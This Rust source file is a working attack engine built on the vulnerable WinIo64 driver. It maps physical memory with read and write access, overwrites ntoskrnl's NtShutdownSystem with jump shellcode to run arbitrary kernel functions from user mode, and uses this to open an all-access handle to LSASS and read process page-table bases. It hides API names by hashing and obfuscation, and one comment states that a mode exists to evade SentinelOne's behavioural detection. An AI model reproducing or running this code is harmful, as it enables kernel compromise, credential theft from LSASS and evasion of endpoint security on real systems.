//! WinIo64.sys DM_KernelSyscall — physical memory R/W via Section mapping
//!
//! WinIo64 driver exposes two IOCTLs via ZwMapViewOfSection for physical memory R/W.
//!
//! Uses ZwOpenSection(\Device\PhysicalMemory) + ZwMapViewOfSection internally,
//! mapping physical pages to user-mode address space with independent R/W PTEs.
//! This bypasses the PTE read-only protection on kernel code pages that causes
//! MmMapIoSpace-based drivers (sfdrvx64) to fail with error 998.

use crate::resolver::*;
use windows::Win32::Foundation::*;

/// WinIo PhysStruct — 40 bytes, METHOD_BUFFERED input/output
#[repr(C)]
#[derive(Clone, Copy, Default)]
struct PhysStruct {
    size: u64,           // +0x00: mapping size in bytes
    phys_addr: u64,      // +0x08: physical address
    section_handle: u64, // +0x10: output — section handle
    mapped_va: u64,      // +0x18: output — user-mode virtual address
    section_object: u64, // +0x20: output — section object
}

type FnCreateFileW =
    unsafe extern "system" fn(*const u16, u32, u32, *const u8, u32, u32, HANDLE) -> HANDLE;
type FnDeviceIoControl = unsafe extern "system" fn(
    HANDLE,
    u32,
    *const u8,
    u32,
    *mut u8,
    u32,
    *mut u32,
    *const u8,
) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;

/// User-mode trampoline — matches NtShutdownSystem layout.
/// Return type is usize (64-bit on x64) to capture full RAX from functions
/// like MmGetPhysicalAddress that return 64-bit values.
type FnTrampoline = unsafe extern "system" fn(
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
) -> usize;

/// DM_KernelSyscall engine (WinIo64 backend)
pub struct DmEngine {
    device: HANDLE,
    fn_ioctl: FnDeviceIoControl,
    fn_close: FnCloseHandle,
    trampoline_user: FnTrampoline,
    trampoline_phys: u64,
    ntos_virt_base: u64,
}

impl DmEngine {
    pub fn new(api: &ApiResolver) -> Result<Self, String> {
        // 1. Resolve Win32 APIs
        let fn_create: FnCreateFileW = unsafe {
            std::mem::transmute(api.k32(HASH_CREATE_FILE_W).ok_or("resolve CreateFileW")?)
        };
        let fn_ioctl: FnDeviceIoControl = unsafe {
            std::mem::transmute(
                api.k32(HASH_DEVICE_IO_CONTROL)
                    .ok_or("resolve DeviceIoControl")?,
            )
        };
        let fn_close: FnCloseHandle = unsafe {
            std::mem::transmute(api.k32(HASH_CLOSE_HANDLE).ok_or("resolve CloseHandle")?)
        };

        // 2. Resolve user-mode trampoline (ntdll!NtShutdownSystem)
        let trampoline_user: FnTrampoline = unsafe {
            std::mem::transmute(
                api.ntdll(HASH_NT_SHUTDOWN_SYSTEM)
                    .ok_or("resolve NtShutdownSystem")?,
            )
        };

        // 3. Open WinIo64 device (\\.\WinIo)
        let path = crate::obfstr_helper::dev_winio();
        let device = unsafe {
            fn_create(
                path.as_ptr(),
                0xC0000000, // GENERIC_READ | GENERIC_WRITE
                0,
                std::ptr::null(),
                3, // OPEN_EXISTING
                0x80,
                HANDLE::default(),
            )
        };
        if device.is_invalid() {
            return Err(format!("open WinIo: error {}", unsafe { GetLastError().0 }));
        }
        println!("    [winio64] Device opened");

        // Quick diagnostic: test map a known physical address (1MB = 0x100000)
        {
            let mut test_ps = PhysStruct {
                size: 4096,
                phys_addr: 0x100000,
                section_handle: 0,
                mapped_va: 0,
                section_object: 0,
            };
            let mut tret = 0u32;
            let tok = unsafe {
                fn_ioctl(
                    device,
                    crate::obfstr_helper::ioctl_winio_map(),
                    &test_ps as *const _ as *const u8,
                    std::mem::size_of::<PhysStruct>() as u32,
                    &mut test_ps as *mut _ as *mut u8,
                    std::mem::size_of::<PhysStruct>() as u32,
                    &mut tret,
                    std::ptr::null(),
                )
            };
            println!(
                "    [winio64] Test map: ok={}, va=0x{:X}, handle=0x{:X}, obj=0x{:X}, ret={}, err={}",
                tok.as_bool(),
                test_ps.mapped_va,
                test_ps.section_handle,
                test_ps.section_object,
                tret,
                unsafe { GetLastError().0 }
            );
            if tok.as_bool() && test_ps.mapped_va != 0 {
                // Read first 8 bytes from mapped VA
                let val = unsafe { *(test_ps.mapped_va as *const u64) };
                println!("    [winio64] Test read @0x100000: 0x{:016X}", val);
                // Unmap
                let _ = unsafe {
                    fn_ioctl(
                        device,
                        crate::obfstr_helper::ioctl_winio_unmap(),
                        &test_ps as *const _ as *const u8,
                        std::mem::size_of::<PhysStruct>() as u32,
                        std::ptr::null_mut(),
                        0,
                        &mut tret,
                        std::ptr::null(),
                    )
                };
            }
        }

        let mut engine = DmEngine {
            device,
            fn_ioctl,
            fn_close,
            trampoline_user,
            trampoline_phys: 0,
            ntos_virt_base: 0,
        };

        // 4. Get ntoskrnl virtual base
        engine.ntos_virt_base = crate::ppl::get_ntoskrnl_base_ntapi()?;
        println!(
            "    [winio64] ntoskrnl virt base: 0x{:016X}",
            engine.ntos_virt_base
        );

        // 5. Find trampoline physical address
        engine.trampoline_phys = engine.locate_syscall()?;
        println!(
            "    [winio64] Trampoline phys: 0x{:016X}",
            engine.trampoline_phys
        );

        Ok(engine)
    }

    /// Create engine with precomputed kernel base and trampoline address.
    ///
    /// Skips NtQuerySystemInformation and physical memory scanning entirely,
    /// breaking the behavioral detection chain that Sentinel ONE monitors.
    pub fn new_precomputed(
        api: &ApiResolver,
        ntos_virt_base: u64,
        trampoline_phys: u64,
    ) -> Result<Self, String> {
        // 1. Resolve Win32 APIs (same as new)
        let fn_ioctl: FnDeviceIoControl = unsafe {
            std::mem::transmute(
                api.k32(HASH_DEVICE_IO_CONTROL)
                    .ok_or("resolve DeviceIoControl")?,
            )
        };
        let fn_close: FnCloseHandle = unsafe {
            std::mem::transmute(api.k32(HASH_CLOSE_HANDLE).ok_or("resolve CloseHandle")?)
        };

        // 2. Resolve user-mode trampoline
        let trampoline_user: FnTrampoline = unsafe {
            std::mem::transmute(
                api.ntdll(HASH_NT_SHUTDOWN_SYSTEM)
                    .ok_or("resolve NtShutdownSystem")?,
            )
        };

        // 3. Open WinIo64 device
        let fn_create: FnCreateFileW = unsafe {
            std::mem::transmute(api.k32(HASH_CREATE_FILE_W).ok_or("resolve CreateFileW")?)
        };
        let path = crate::obfstr_helper::dev_winio();
        let device = unsafe {
            fn_create(
                path.as_ptr(),
                0xC0000000,
                0,
                std::ptr::null(),
                3,
                0x80,
                HANDLE::default(),
            )
        };
        if device.is_invalid() {
            return Err(format!("open WinIo: error {}", unsafe { GetLastError().0 }));
        }

        // 4. Use precomputed values — NO kernel base query, NO physical memory scan
        Ok(DmEngine {
            device,
            fn_ioctl,
            fn_close,
            trampoline_user,
            trampoline_phys,
            ntos_virt_base,
        })
    }

    /// Return precomputed values for passing to another process invocation.
    pub fn get_precomputed_values(&self) -> (u64, u64) {
        (self.ntos_virt_base, self.trampoline_phys)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Physical memory primitives (WinIo64 Section mapping)
    // ═══════════════════════════════════════════════════════════════════════

    /// Map physical memory to user-mode VA, returns (mapped_va, PhysStruct for unmap)
    fn map_phys(&self, phys_addr: u64, size: u64) -> Result<(usize, PhysStruct), String> {
        let mut ps = PhysStruct {
            size,
            phys_addr,
            section_handle: 0,
            mapped_va: 0,
            section_object: 0,
        };

        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.device,
                crate::obfstr_helper::ioctl_winio_map(),
                &ps as *const _ as *const u8,
                std::mem::size_of::<PhysStruct>() as u32,
                &mut ps as *mut _ as *mut u8,
                std::mem::size_of::<PhysStruct>() as u32,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() || ps.mapped_va == 0 {
            return Err(format!(
                "map_phys 0x{:X} ({}B): ioctl failed, err={}",
                phys_addr,
                size,
                unsafe { GetLastError().0 }
            ));
        }
        Ok((ps.mapped_va as usize, ps))
    }

    /// Unmap previously mapped physical memory
    fn unmap_phys(&self, ps: &PhysStruct) -> Result<(), String> {
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.device,
                crate::obfstr_helper::ioctl_winio_unmap(),
                ps as *const _ as *const u8,
                std::mem::size_of::<PhysStruct>() as u32,
                std::ptr::null_mut(),
                0,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() {
            return Err(format!(
                "unmap_phys 0x{:X}: ioctl failed, err={}",
                ps.phys_addr,
                unsafe { GetLastError().0 }
            ));
        }
        Ok(())
    }

    /// Read physical memory: map → memcpy → unmap
    pub fn read_phys(&self, phys_addr: u64, buf: &mut [u8]) -> Result<(), String> {
        let (va, ps) = self.map_phys(phys_addr, buf.len() as u64)?;
        unsafe {
            std::ptr::copy_nonoverlapping(va as *const u8, buf.as_mut_ptr(), buf.len());
        }
        self.unmap_phys(&ps)?;
        Ok(())
    }

    /// Write physical memory: map → memcpy → unmap
    /// Uses Section-based mapping → creates independent R/W PTEs → works on code pages!
    fn write_phys(&self, phys_addr: u64, data: &[u8]) -> Result<(), String> {
        let (va, ps) = self.map_phys(phys_addr, data.len() as u64)?;
        unsafe {
            std::ptr::copy_nonoverlapping(data.as_ptr(), va as *mut u8, data.len());
        }
        self.unmap_phys(&ps)?;
        Ok(())
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Physical memory range discovery (from registry)
    // ═══════════════════════════════════════════════════════════════════════

    fn get_physical_memory_ranges() -> Result<Vec<(u64, u64)>, String> {
        use windows::Win32::System::Registry::*;

        let mut key = HKEY::default();
        let subkey = crate::obfstr_helper::phys_mem_regkey();

        let status = unsafe {
            RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                windows::core::PCWSTR(subkey.as_ptr()),
                0,
                KEY_READ,
                &mut key,
            )
        };
        if status.is_err() {
            return Err(format!("RegOpenKeyExW failed: {:?}", status));
        }

        let value_name_buf = crate::obfstr_helper::translated_value();
        let value_name = windows::core::PCWSTR(value_name_buf.as_ptr());
        let mut data_type = REG_VALUE_TYPE::default();
        let mut data_size: u32 = 0;

        unsafe {
            let _ = RegQueryValueExW(
                key,
                value_name,
                None,
                Some(&mut data_type),
                None,
                Some(&mut data_size),
            );
        }
        if data_size == 0 {
            unsafe {
                let _ = RegCloseKey(key);
            }
            return Err("Physical Memory registry value empty".into());
        }

        let mut data = vec![0u8; data_size as usize];
        let status = unsafe {
            RegQueryValueExW(
                key,
                value_name,
                None,
                Some(&mut data_type),
                Some(data.as_mut_ptr()),
                Some(&mut data_size),
            )
        };
        unsafe {
            let _ = RegCloseKey(key);
        }
        if status.is_err() {
            return Err(format!("RegQueryValueExW failed: {:?}", status));
        }

        let mut ranges = Vec::new();
        if data.len() < 24 {
            return Err(format!("Registry data too short: {} bytes", data.len()));
        }

        let count = u32::from_le_bytes(data[16..20].try_into().unwrap()) as usize;
        let mut offset = 20usize;

        for i in 0..count {
            if offset + 20 > data.len() {
                break;
            }
            let _entry_type = data[offset];
            let flags = u16::from_le_bytes(data[offset + 2..offset + 4].try_into().unwrap());
            let p_begin = u64::from_le_bytes(data[offset + 4..offset + 12].try_into().unwrap());
            let size_raw = u32::from_le_bytes(data[offset + 12..offset + 16].try_into().unwrap());

            let size: u64 = if flags & 0x200 != 0 {
                (size_raw as u64) << 8
            } else if flags & 0x400 != 0 {
                (size_raw as u64) << 16
            } else if flags & 0x800 != 0 {
                (size_raw as u64) << 32
            } else {
                size_raw as u64
            };

            println!(
                "    [winio64] Range {}: base=0x{:X} size=0x{:X} ({:.1}MB)",
                i,
                p_begin,
                size,
                size as f64 / (1024.0 * 1024.0)
            );

            if p_begin >= 0x10000 && size > 0 {
                ranges.push((p_begin, size));
            }
            offset += 20;
        }

        if ranges.is_empty() {
            return Err("No valid physical memory ranges found".into());
        }

        println!(
            "    [winio64] {} physical memory ranges ({} MB)",
            ranges.len(),
            ranges.iter().map(|(_, s)| s).sum::<u64>() / (1024 * 1024)
        );

        Ok(ranges)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Trampoline locator
    // ═══════════════════════════════════════════════════════════════════════

    fn locate_syscall(&self) -> Result<u64, String> {
        let ranges = Self::get_physical_memory_ranges()?;

        let (nt_rva, ref_bytes) = Self::get_trampoline_info()?;
        println!("    [winio64] NtShutdownSystem RVA: 0x{:X}", nt_rva);
        println!(
            "    [winio64] Reference bytes: {:02X?}",
            &ref_bytes[..8.min(ref_bytes.len())]
        );

        let large_page: u64 = 0x20_0000; // 2MB ntoskrnl alignment
        let match_len = ref_bytes.len();

        use std::io::Write;
        let mut total_reads = 0u64;
        let mut total_candidates = 0u64;

        println!("    [winio64] Scanning physical memory...");
        let mut total_errors = 0u64;
        let mut first_error: Option<String> = None;

        for (range_idx, (range_base, range_size)) in ranges.iter().enumerate() {
            let range_end = range_base + range_size;
            let start = std::cmp::max(*range_base, 0x10_0000);
            if start >= range_end {
                continue;
            }

            let first_cand = (start + large_page - 1) & !(large_page - 1);
            let mut cand = first_cand;

            while cand < range_end {
                let func_addr = cand + nt_rva as u64;
                if func_addr + match_len as u64 <= range_end {
                    let mut buf = vec![0u8; match_len];
                    if let Ok(()) = self.read_phys(func_addr, &mut buf) {
                        total_reads += 1;
                        if buf == ref_bytes {
                            println!(
                                "\r    [winio64] Code match! phys=0x{:X} base=0x{:X}   ",
                                func_addr, cand
                            );
                            total_candidates += 1;

                            if self.verify_trampoline(func_addr)? {
                                println!(
                                    "    [winio64] ✓ Verified! ({} reads, {} candidates)",
                                    total_reads, total_candidates
                                );
                                return Ok(func_addr);
                            }
                            println!("    [winio64] ✗ Verify failed, continuing...");
                        }
                    } else {
                        total_errors += 1;
                        if first_error.is_none() {
                            first_error = self.read_phys(func_addr, &mut buf).err();
                        }
                    }
                }

                cand += large_page;

                if total_reads % 200 == 0 {
                    print!(
                        "\r    [winio64] Range {}/{}: {} reads, addr=0x{:X}   ",
                        range_idx + 1,
                        ranges.len(),
                        total_reads,
                        cand
                    );
                    let _ = std::io::stdout().flush();
                }
            }
        }
        println!(
            "\r    [winio64] Done: {} reads, {} errors, not found   ",
            total_reads, total_errors
        );
        if let Some(err) = first_error {
            println!("    [winio64] First error: {}", err);
        }

        Err("NtShutdownSystem not found in physical memory".to_string())
    }

    /// Get NtShutdownSystem RVA and first 32 bytes of code from on-disk ntoskrnl.exe
    fn get_trampoline_info() -> Result<(u32, Vec<u8>), String> {
        let ntos_wide = crate::obfstr_helper::ntos_filename_wide();
        let lib = unsafe {
            windows::Win32::System::LibraryLoader::LoadLibraryExW(
                windows::core::PCWSTR(ntos_wide.as_ptr()),
                None,
                windows::Win32::System::LibraryLoader::DONT_RESOLVE_DLL_REFERENCES,
            )
        }
        .map_err(|e| format!("LoadLibraryExW: {}", e))?;

        let base = lib.0 as *const u8;
        let nt_name = crate::obfstr_helper::nt_shutdown_system_bytes();
        let func = unsafe {
            windows::Win32::System::LibraryLoader::GetProcAddress(
                lib,
                windows::core::PCSTR(nt_name.as_ptr()),
            )
        };
        let func_addr = func.ok_or("export not found")?;
        let rva = (func_addr as usize - base as usize) as u32;

        let mut ref_bytes = vec![0u8; 32];
        unsafe {
            std::ptr::copy_nonoverlapping(func_addr as *const u8, ref_bytes.as_mut_ptr(), 32);
        }

        Ok((rva, ref_bytes))
    }

    /// Verify a candidate trampoline address by writing test shellcode and calling it
    fn verify_trampoline(&self, phys_addr: u64) -> Result<bool, String> {
        let shellcode: [u8; 13] = [
            0x48, 0x29, 0xC0, // sub rax, rax
            0x48, 0x83, 0xC0, 0x42, // add rax, 0x42
            0x48, 0x83, 0xE8, 0x42, // sub rax, 0x42
            0x90, // nop
            0xC3, // ret
        ];

        let mut orig = [0u8; 13];
        self.read_phys(phys_addr, &mut orig)?;
        self.write_phys(phys_addr, &shellcode)?;

        let result = unsafe { (self.trampoline_user)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0) };

        self.write_phys(phys_addr, &orig)?;

        Ok(result == 0) // STATUS_SUCCESS
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DM_KernelSyscall core
    // ═══════════════════════════════════════════════════════════════════════

    /// Execute a kernel function by patching the trampoline.
    /// Returns NTSTATUS (i32) — truncated from the full usize return.
    pub unsafe fn kernel_syscall(&self, target_func: &str, args: &[usize]) -> Result<i32, String> {
        Ok(self.kernel_syscall_raw(target_func, args)? as i32)
    }

    /// Execute a kernel function, returning the full 64-bit RAX value.
    /// Use for functions like MmGetPhysicalAddress that return 64-bit values.
    pub unsafe fn kernel_syscall_raw(
        &self,
        target_func: &str,
        args: &[usize],
    ) -> Result<u64, String> {
        let target_rva = Self::find_export_rva_from_disk(target_func)?;
        let target_va = self.ntos_virt_base + target_rva as u64;

        // Build jmp shellcode: FF 25 00 00 00 00 [8-byte addr]
        let mut jmp_code = [0u8; 14];
        jmp_code[0] = 0xFF;
        jmp_code[1] = 0x25;
        jmp_code[6..14].copy_from_slice(&target_va.to_le_bytes());

        let mut orig = [0u8; 14];
        self.read_phys(self.trampoline_phys, &mut orig)?;
        self.write_phys(self.trampoline_phys, &jmp_code)?;

        let a = |i: usize| -> usize {
            if i < args.len() {
                args[i]
            } else {
                0
            }
        };
        let result =
            (self.trampoline_user)(a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9));

        self.write_phys(self.trampoline_phys, &orig)?;
        Ok(result as u64)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // High-level kernel operations
    // ═══════════════════════════════════════════════════════════════════════

    /// Open LSASS handle via kernel-mode ZwOpenProcess + ZwDuplicateObject
    pub fn open_process(&self, pid: u32) -> Result<HANDLE, String> {
        #[repr(C)]
        struct ClientId {
            unique_process: usize,
            unique_thread: usize,
        }
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: usize,
            object_name: usize,
            attributes: u32,
            security_descriptor: usize,
            security_qos: usize,
        }

        let obj_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name: 0,
            attributes: 0x200, // OBJ_CASE_INSENSITIVE
            security_descriptor: 0,
            security_qos: 0,
        };

        // 1. ZwOpenProcess(lsass)
        let mut h_lsass: usize = 0;
        let cid_lsass = ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };

        let status = unsafe {
            self.kernel_syscall(
                "ZwOpenProcess",
                &[
                    &mut h_lsass as *mut usize as usize,
                    0x1F0FFF, // PROCESS_ALL_ACCESS
                    &obj_attr as *const _ as usize,
                    &cid_lsass as *const _ as usize,
                ],
            )?
        };
        if status < 0 {
            return Err(format!(
                "ZwOpenProcess(lsass) failed: 0x{:08X}",
                status as u32
            ));
        }
        println!("    [winio64] Kernel handle to LSASS: 0x{:X}", h_lsass);

        // 2. ZwOpenProcess(current)
        let mut h_current: usize = 0;
        let current_pid = unsafe { windows::Win32::System::Threading::GetCurrentProcessId() };
        let cid_current = ClientId {
            unique_process: current_pid as usize,
            unique_thread: 0,
        };

        let status = unsafe {
            self.kernel_syscall(
                "ZwOpenProcess",
                &[
                    &mut h_current as *mut usize as usize,
                    0x1F0FFF,
                    &obj_attr as *const _ as usize,
                    &cid_current as *const _ as usize,
                ],
            )?
        };
        if status < 0 {
            return Err(format!(
                "ZwOpenProcess(current) failed: 0x{:08X}",
                status as u32
            ));
        }
        println!("    [winio64] Kernel handle to current: 0x{:X}", h_current);

        // 3. ZwDuplicateObject
        let mut h_user: usize = 0;
        let status = unsafe {
            self.kernel_syscall(
                &crate::obfstr_helper::zw_duplicate_object(),
                &[
                    usize::MAX, // NtCurrentProcess() = (HANDLE)-1
                    h_lsass,
                    h_current,
                    &mut h_user as *mut usize as usize,
                    0,    // DesiredAccess (0 = same)
                    0,    // HandleAttributes
                    0x04, // DUPLICATE_SAME_ACCESS
                ],
            )?
        };
        if status < 0 {
            return Err(format!("ZwDuplicateObject failed: 0x{:08X}", status as u32));
        }
        println!("    [winio64] User-mode handle: 0x{:X}", h_user);

        // 4. Close kernel handles
        unsafe {
            let _ = self.kernel_syscall(&crate::obfstr_helper::zw_close(), &[h_lsass]);
            let _ = self.kernel_syscall(&crate::obfstr_helper::zw_close(), &[h_current]);
        }

        Ok(HANDLE(h_user as *mut _))
    }

    /// Get the CR3 (DirectoryTableBase) of a target process via kernel-mode.
    ///
    /// Uses PsLookupProcessByProcessId to get EPROCESS pointer,
    /// then MmGetPhysicalAddress to translate EPROCESS+0x28 to physical address,
    /// then reads CR3 via read_phys.
    pub fn get_process_cr3(&self, pid: u32) -> Result<u64, String> {
        // 1. PsLookupProcessByProcessId(pid, &eprocess_ptr)
        let mut eprocess: usize = 0;
        let status = unsafe {
            self.kernel_syscall(
                &crate::obfstr_helper::ps_lookup_process(),
                &[pid as usize, &mut eprocess as *mut usize as usize],
            )?
        };
        if status < 0 {
            return Err(format!(
                "PsLookupProcessByProcessId failed: 0x{:08X}",
                status as u32
            ));
        }
        println!("    [engine] EPROCESS: 0x{:X}", eprocess);

        // 2. MmGetPhysicalAddress(eprocess + 0x28) → full 64-bit PHYSICAL_ADDRESS
        //    Uses kernel_syscall_raw to capture the full 64-bit RAX return value.
        let dtb_va = eprocess + 0x28;
        let phys = unsafe {
            self.kernel_syscall_raw(&crate::obfstr_helper::mm_get_physical_address(), &[dtb_va])?
        };

        // 3. ObfDereferenceObject(eprocess) — cleanup reference count
        unsafe {
            let _ = self.kernel_syscall(&crate::obfstr_helper::obf_deref_object(), &[eprocess]);
        }

        if phys == 0 {
            return Err("MmGetPhysicalAddress returned 0".into());
        }
        println!("    [engine] DTB phys addr: 0x{:X}", phys);

        // 4. Read 8 bytes at the physical address to get CR3
        let mut cr3_buf = [0u8; 8];
        self.read_phys(phys, &mut cr3_buf)?;
        let cr3 = u64::from_le_bytes(cr3_buf);

        println!("    [engine] CR3: 0x{:X}", cr3);
        Ok(cr3)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // PE export parsing (from disk)
    // ═══════════════════════════════════════════════════════════════════════

    fn find_export_rva_from_disk(func_name: &str) -> Result<u32, String> {
        let path = crate::obfstr_helper::ntos_path();
        let data = std::fs::read(&path).map_err(|e| format!("read failed: {}", e))?;

        let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
        let opt_off = pe_off + 24;
        let export_rva =
            u32::from_le_bytes(data[opt_off + 112..opt_off + 116].try_into().unwrap()) as usize;
        let export_size =
            u32::from_le_bytes(data[opt_off + 116..opt_off + 120].try_into().unwrap()) as usize;

        if export_rva == 0 {
            return Err("No export directory".into());
        }

        let num_sections =
            u16::from_le_bytes(data[pe_off + 6..pe_off + 8].try_into().unwrap()) as usize;
        let opt_hdr_size =
            u16::from_le_bytes(data[pe_off + 20..pe_off + 22].try_into().unwrap()) as usize;
        let sections_off = pe_off + 24 + opt_hdr_size;

        let rva_to_offset = |rva: usize| -> Option<usize> {
            for i in 0..num_sections {
                let s = sections_off + i * 40;
                let vaddr = u32::from_le_bytes(data[s + 12..s + 16].try_into().unwrap()) as usize;
                let vsize = u32::from_le_bytes(data[s + 8..s + 12].try_into().unwrap()) as usize;
                let raw_off = u32::from_le_bytes(data[s + 20..s + 24].try_into().unwrap()) as usize;
                if rva >= vaddr && rva < vaddr + vsize {
                    return Some(raw_off + (rva - vaddr));
                }
            }
            None
        };

        let exp_off = rva_to_offset(export_rva).ok_or("map export dir RVA")?;
        let num_names =
            u32::from_le_bytes(data[exp_off + 24..exp_off + 28].try_into().unwrap()) as usize;
        let addr_table_rva =
            u32::from_le_bytes(data[exp_off + 28..exp_off + 32].try_into().unwrap()) as usize;
        let name_table_rva =
            u32::from_le_bytes(data[exp_off + 32..exp_off + 36].try_into().unwrap()) as usize;
        let ord_table_rva =
            u32::from_le_bytes(data[exp_off + 36..exp_off + 40].try_into().unwrap()) as usize;

        let name_table_off = rva_to_offset(name_table_rva).ok_or("map name table")?;
        let ord_table_off = rva_to_offset(ord_table_rva).ok_or("map ord table")?;
        let addr_table_off = rva_to_offset(addr_table_rva).ok_or("map addr table")?;

        for i in 0..num_names {
            let name_rva = u32::from_le_bytes(
                data[name_table_off + i * 4..name_table_off + i * 4 + 4]
                    .try_into()
                    .unwrap(),
            ) as usize;
            let name_off = match rva_to_offset(name_rva) {
                Some(o) => o,
                None => continue,
            };
            let end = data[name_off..].iter().position(|&b| b == 0).unwrap_or(256);
            let name = std::str::from_utf8(&data[name_off..name_off + end]).unwrap_or("");

            if name == func_name {
                let ordinal = u16::from_le_bytes(
                    data[ord_table_off + i * 2..ord_table_off + i * 2 + 2]
                        .try_into()
                        .unwrap(),
                ) as usize;
                let func_rva = u32::from_le_bytes(
                    data[addr_table_off + ordinal * 4..addr_table_off + ordinal * 4 + 4]
                        .try_into()
                        .unwrap(),
                );
                if (func_rva as usize) >= export_rva
                    && (func_rva as usize) < export_rva + export_size
                {
                    return Err(format!("{} is forwarded", func_name));
                }
                return Ok(func_rva);
            }
        }
        Err(format!("'{}' not found in ntoskrnl exports", func_name))
    }
}

impl Drop for DmEngine {
    fn drop(&mut self) {
        unsafe {
            let _ = (self.fn_close)(self.device);
        }
    }
}
